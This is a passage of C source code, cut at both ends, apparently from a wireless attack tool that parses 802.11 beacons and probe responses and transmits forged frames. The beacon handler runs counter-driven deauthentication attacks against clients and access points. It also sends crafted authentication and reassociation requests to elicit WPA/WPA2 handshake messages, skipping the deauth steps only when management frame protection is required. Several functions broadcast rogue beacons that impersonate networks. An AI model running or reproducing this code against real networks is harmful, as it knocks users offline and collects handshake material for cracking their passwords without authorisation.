static capap_t *capabilitiesptr;
static int apinfolen;
static uint8_t *apinfoptr;
static uint8_t apchannel;

tfctimestamp = timestamp;
if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
apchannel = get_tag_channel(apinfolen, apinfoptr);
if((apchannel != ptrscanlist->channel) && (apchannel != 0)) return;
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) break;
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		get_taglist((bssidlist +p)->bssidinfo, apinfolen, apinfoptr);
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->proberesponsecount += 1;
		if(((bssidlist +p)->bssidinfo->status & BSSID_PROBERESPONSE) != BSSID_PROBERESPONSE)
			{
			(bssidlist +p)->bssidinfo->status |= BSSID_PROBERESPONSE;
			writeepb(fd_pcapng);
			return;
			}
		if((bssidlist +p)->bssidinfo->proberesponsecount %100 == 0) writeepb(fd_pcapng);
		if(p >= BSSIDLIST_SORT_MAX) qsort(bssidlist, p +1, BSSIDLIST_SIZE, sort_bssidlist_by_time);
		return;
		}
	}
memset((bssidlist +p)->bssidinfo, 0, BSSIDINFO_SIZE);
get_taglist((bssidlist +p)->bssidinfo, apinfolen, apinfoptr);
(bssidlist +p)->timestamp = timestamp;
memcpy((bssidlist +p)->mac, macfrx->addr3, 6);
(bssidlist +p)->bssidinfo->timestampfirst = timestamp;
(bssidlist +p)->bssidinfo->proberesponsecount = 1;
(bssidlist +p)->bssidinfo->aid = 0xc001;
(bssidlist +p)->bssidinfo->timestampclient = timestamp;
memset((bssidlist +p)->bssidinfo->macclient, 0xff, 6);
(bssidlist +p)->bssidinfo->status = BSSID_PROBERESPONSE;
capabilitiesptr = (capap_t*)payloadptr;
(bssidlist +p)->bssidinfo->capabilities = capabilitiesptr->capabilities;
qsort(bssidlist, p +1, BSSIDLIST_SIZE, sort_bssidlist_by_time);
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211beacon()
{
static int p;
static capap_t *capabilitiesptr;
static int apinfolen;
static uint8_t *apinfoptr;
static uint8_t apchannel;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
apchannel = get_tag_channel(apinfolen, apinfoptr);
if((apchannel != ptrscanlist->channel) && (apchannel != 0)) return;
for(p = 0; p < BSSIDLIST_MAX; p++)
	{
	if((bssidlist +p)->timestamp == 0) break;
	if(memcmp((bssidlist +p)->mac, macfrx->addr3, 6) == 0)
		{
		(bssidlist +p)->timestamp = timestamp;
		(bssidlist +p)->bssidinfo->beaconcount += 1;
		if(((bssidlist +p)->bssidinfo->status & BSSID_BEACON) != BSSID_BEACON)
			{
			(bssidlist +p)->bssidinfo->status |= BSSID_BEACON;
			get_taglist((bssidlist +p)->bssidinfo, apinfolen, apinfoptr);
			writeepb(fd_pcapng);
			}
		if((bssidlist +p)->bssidinfo->status >= BSSID_M4) return;
		if((bssidlist +p)->bssidinfo->kdv == 0) return;
		if((timestamp - (bssidlist +p)->bssidinfo->timestampclient) > 600000000)
			{
			#ifdef GETM1234
			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) == 0) send_pspoll(p);
			else if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
			#endif
			memset((bssidlist +p)->bssidinfo->macclient, 0xff, 6);
			return;
			}
		if((bssidlist +p)->bssidinfo->deauthattackcount >= ((bssidlist +p)->bssidinfo->deauthattackfactor +26))
			{
			(bssidlist +p)->bssidinfo->deauthattackcount = 0;
			(bssidlist +p)->bssidinfo->deauthattackfactor += 1;
			get_taglist((bssidlist +p)->bssidinfo, apinfolen, apinfoptr);
			#ifdef GETM1234
			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) == 0) send_pspoll(p);
			else if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
			#endif
			qsort(bssidlist, p +1, BSSIDLIST_SIZE, sort_bssidlist_by_time);
			return;
			}
		(bssidlist +p)->bssidinfo->deauthattackcount += 1;
		#ifdef GETM1
		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +2))
			{
			if(((bssidlist +p)->bssidinfo->status &BSSID_M1) == 0)
				{
				if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
				else
					{
					if(((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK) send_authentication_req_opensystem(p);
					else if((((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK))
						{
						if(ptrscanlist->frequency < 3000) send_reassociation_req_wpa1(p);
						else send_reassociation_req_wpa1_5(p);
						}
					}
				return;
				}
			return;
			}
		#endif
		#ifdef GETM1234
		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +6))
			{
			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) == 0) send_pspoll(p);
			else send_authentication_req_opensystem_cl(p);
			return;
			}
		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +10))
			{
			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) == 0) send_pspoll(p);
			else if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
			else
				{
				if((((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK))
					{
					if(ptrscanlist->frequency < 3000) send_association_req_wpa2_cl(p);
					else send_association_req_wpa2_cl_5(p);
					}
				else if((((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK)) 
					{
					if(ptrscanlist->frequency < 3000) send_association_req_wpa1_cl(p);
					else send_association_req_wpa1_cl_5(p);
					}
				}
			return;
			}
		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +14))
			{
			if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
			else
				{
				if((((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK))
					{
					if(ptrscanlist->frequency < 3000) send_reassociation_req_wpa2(p);
					else send_reassociation_req_wpa2_5(p);
					}
				else if((((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK))
					{
					if(ptrscanlist->frequency < 3000) send_reassociation_req_wpa1(p);
					else send_reassociation_req_wpa1_5(p);
					}
				}
			return;
			}
		#endif
		if(((bssidlist +p)->bssidinfo->rsncapa &MFP_REQUIRED) != 0) return;
		#ifdef GETM1234
		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +18))
			{
			send_deauthentication2client(p, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);
			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) != 0) send_deauthentication2ap(p, WLAN_REASON_DEAUTH_LEAVING);
			return;
			}
		#endif
		#ifdef GETM1234
		if((bssidlist +p)->bssidinfo->deauthattackcount == ((bssidlist +p)->bssidinfo->deauthattackfactor +22))
			{
			send_deauthentication2client(p, WLAN_REASON_CLASS2_FRAME_FROM_NONAUTH_STA);
			if(memcmp(&mac_broadcast, (bssidlist +p)->bssidinfo->macclient, 6) != 0) send_deauthentication2ap(p, WLAN_REASON_DEAUTH_LEAVING);
			return;
			}
		#endif
		return;
		}
	}
memset((bssidlist +p)->bssidinfo, 0, BSSIDINFO_SIZE);
get_taglist((bssidlist +p)->bssidinfo, apinfolen, apinfoptr);
(bssidlist +p)->timestamp = timestamp;
memcpy((bssidlist +p)->mac, macfrx->addr3, 6);
(bssidlist +p)->bssidinfo->timestampfirst = timestamp;
(bssidlist +p)->bssidinfo->beaconcount = 1;
(bssidlist +p)->bssidinfo->aid = 0xc001;
(bssidlist +p)->bssidinfo->timestampclient = timestamp;
memset((bssidlist +p)->bssidinfo->macclient, 0xff, 6);
(bssidlist +p)->bssidinfo->status = BSSID_BEACON;
capabilitiesptr = (capap_t*)payloadptr;
(bssidlist +p)->bssidinfo->capabilities = capabilitiesptr->capabilities;
tfctimestamp = timestamp;
#ifdef GETM1234
if((bssidlist +p)->bssidinfo->kdv != 0)
	{
	if(((bssidlist +p)->bssidinfo->essidlen == 0) || ((bssidlist +p)->bssidinfo->essid[0] == 0)) send_pspoll(p);
	else
		{
		if((((bssidlist +p)->bssidinfo->rsnakm &TAK_PSK) == TAK_PSK))
			{
			send_authentication_req_opensystem(p);
			if(ptrscanlist->frequency < 3000) send_reassociation_req_wpa2(p);
			else send_reassociation_req_wpa2_5(p);
			}
		else if((((bssidlist +p)->bssidinfo->wpaakm &TAK_PSK) == TAK_PSK))
			{
			if(ptrscanlist->frequency < 3000) send_reassociation_req_wpa1(p);
			else send_reassociation_req_wpa1_5(p);
			}
		}
	send_deauthentication2client(p, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA);
	}
#endif
qsort(bssidlist, p +1, BSSIDLIST_SIZE, sort_bssidlist_by_time);
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void send_beacon()
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t beacon_data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: TIM Information */
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: RSN Information CCM CCM PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define BEACON_DATA_SIZE sizeof(beacon_data)

if(rgbssidlistp > rgbssidlistmax) rgbssidlistp = 0;
if((rgbssidlist +rgbssidlistp)->timestamp == 0)
	{
	rgbssidlistp = 0;
	return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, (rgbssidlist +rgbssidlistp)->mac, 6);
memcpy(macftx->addr3, (rgbssidlist +rgbssidlistp)->mac, 6);
macftx->sequence = (rgbssidlist +rgbssidlistp)->sequence++ << 4;
if((rgbssidlist +rgbssidlistp)->sequence > 4095) (rgbssidlist +rgbssidlistp)->sequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = (rgbssidlist +rgbssidlistp)->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], (rgbssidlist +rgbssidlistp)->essid, (rgbssidlist +rgbssidlistp)->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +(rgbssidlist +rgbssidlistp)->essidlen], beacon_data, BEACON_DATA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +(rgbssidlist +rgbssidlistp)->essidlen +0xc] = ptrscanlist->channel;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +(rgbssidlist +rgbssidlistp)->essidlen +BEACON_DATA_SIZE;
fdwrite();
rgbssidlistp++;
return;
}
/*===========================================================================*/
static inline void send_beacon_5()
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t beacon_data[] =
{
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: TIM Information */
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: RSN Information CCM CCM PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define BEACON_DATA_SIZE sizeof(beacon_data)

if(rgbssidlistp > rgbssidlistmax) rgbssidlistp = 0;
if((rgbssidlist +rgbssidlistp)->timestamp == 0)
	{
	rgbssidlistp = 0;
	return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, (rgbssidlist +rgbssidlistp)->mac, 6);
memcpy(macftx->addr3, (rgbssidlist +rgbssidlistp)->mac, 6);
macftx->sequence = (rgbssidlist +rgbssidlistp)->sequence++ << 4;
if((rgbssidlist +rgbssidlistp)->sequence > 4095) (rgbssidlist +rgbssidlistp)->sequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = (rgbssidlist +rgbssidlistp)->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], (rgbssidlist +rgbssidlistp)->essid, (rgbssidlist +rgbssidlistp)->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +(rgbssidlist +rgbssidlistp)->essidlen], beacon_data, BEACON_DATA_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +(rgbssidlist +rgbssidlistp)->essidlen +BEACON_DATA_SIZE;
fdwrite();
rgbssidlistp++;
return;
}
/*===========================================================================*/
static inline void send_beacon1()
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t beacon_data[] =
{
/* Tag: Wildcard */
0x00, 0x00,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: TIM Information */
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: RSN Information CCM CCM PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define BEACON_DATA_SIZE sizeof(beacon_data)

if(rgbssidlistp > rgbssidlistmax) rgbssidlistp = 0;
if((rgbssidlist +rgbssidlistp)->timestamp == 0)
	{
	rgbssidlistp = 0;
	return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, (rgbssidlist +rgbssidlistp)->mac, 6);
memcpy(macftx->addr3, (rgbssidlist +rgbssidlistp)->mac, 6);
macftx->sequence = (rgbssidlist +rgbssidlistp)->sequence++ << 4;
if((rgbssidlist +rgbssidlistp)->sequence > 4095) (rgbssidlist +rgbssidlistp)->sequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], beacon_data, BEACON_DATA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0xe] = ptrscanlist->channel;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE;
fdwrite();
rgbssidlistp++;
return;
}
/*===========================================================================*/
static inline void send_beacon1_5()
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t beacon_data[] =
{
/* Tag: Wildcard */
0x00, 0x00,
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: TIM Information */
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: RSN Information CCM CCM PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x04,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define BEACON_DATA_SIZE sizeof(beacon_data)

if(rgbssidlistp > rgbssidlistmax) rgbssidlistp = 0;
if((rgbssidlist +rgbssidlistp)->timestamp == 0)
	{
	rgbssidlistp = 0;
	return;
	}
packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, (rgbssidlist +rgbssidlistp)->mac, 6);
memcpy(macftx->addr3, (rgbssidlist +rgbssidlistp)->mac, 6);
macftx->sequence = (rgbssidlist +rgbssidlistp)->sequence++ << 4;
if((rgbssidlist +rgbssidlistp)->sequence > 4095) (rgbssidlist +rgbssidlistp)->sequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], beacon_data, BEACON_DATA_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE;
fdwrite();
rgbssidlistp++;
return;
}
/*===========================================================================*/
static inline void send_beacon_wildcard()
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t beacon_data[] =
{
/* Tag: Wildcard */
0x00, 0x00,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: TIM Information */
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define BEACON_DATA_SIZE sizeof(beacon_data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &macrgbwcopen, 6);
memcpy(macftx->addr3, &macrgbwcopen, 6);
macftx->sequence = beaconsequence++ << 4;
if(beaconsequence > 4095) beaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], beacon_data, BEACON_DATA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0xe] = ptrscanlist->channel;
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_beacon_wildcard_5()
{
static mac_t *macftx;
static capap_t *capap;

const uint8_t beacon_data[] =
{
/* Tag: Wildcard */
0x00, 0x00,
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c,
/* Tag: TIM Information */
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
};
#define BEACON_DATA_SIZE sizeof(beacon_data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_BEACON;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &macrgbwcopen, 6);
memcpy(macftx->addr3, &macrgbwcopen, 6);
macftx->sequence = beaconsequence++ << 4;
if(beaconsequence > 4095) beaconsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0xc8;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], beacon_data, BEACON_DATA_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BEACON_DATA_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_proberequest_wildcard()
{
static mac_t *macftx;

static const uint8_t undirectedproberequestdata[] =
{
/* Tag: Wildcard */
0x00, 0x00,
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &macrgclient, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void send_proberequest_wildcard_5()
{
static mac_t *macftx;

static const uint8_t undirectedproberequestdata[] =
{
/* Tag: Wildcard */
0x00, 0x00,
/* Tag: Supported Rates 6(B), 9, 12(B), 18, 24(B), 36, 48, 54, [Mbit/sec] */
0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ESSID_LEN_MAX +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macftx->addr1, &mac_broadcast, 6);
memcpy(macftx->addr2, &macrgclient, 6);
memcpy(macftx->addr3, &mac_broadcast, 6);
macftx->sequence = clientsequence++ << 4;
if(clientsequence > 4095) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
packetoutlen = HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE;
fdwrite();
return;
}
/*===========================================================================*/
static inline void process_packet()
{
static int rthl;
static rth_t *rth;
static uint32_t rthp;

packetlen = read(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN);
if(packetlen < (int)RTH_SIZE)
	{
	errorcount++;
	return;
	}
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if((rth->it_version != 0) || (rth->it_pad != 0) || (rth->it_present == 0))
	{
	errorcount++;
	return;
	}
rthl = le16toh(rth->it_len);
if(rthl > packetlen)
	{
	errorcount++;
